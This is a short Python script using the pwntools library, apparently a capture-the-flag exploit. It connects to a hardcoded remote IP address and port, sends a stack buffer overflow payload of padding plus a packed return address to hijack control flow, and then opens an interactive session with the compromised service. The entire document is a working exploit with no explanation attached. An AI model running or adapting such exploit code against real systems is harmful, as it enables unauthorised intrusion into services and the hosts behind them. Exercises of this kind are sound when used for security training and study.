from pwn import *

sh = remote('114.116.54.89','10003')
payload = 'a' * 48 + 'a' * 8 + p64(0x400751)
sh.recvline()
sh.sendline(payload)
sh.interactive()

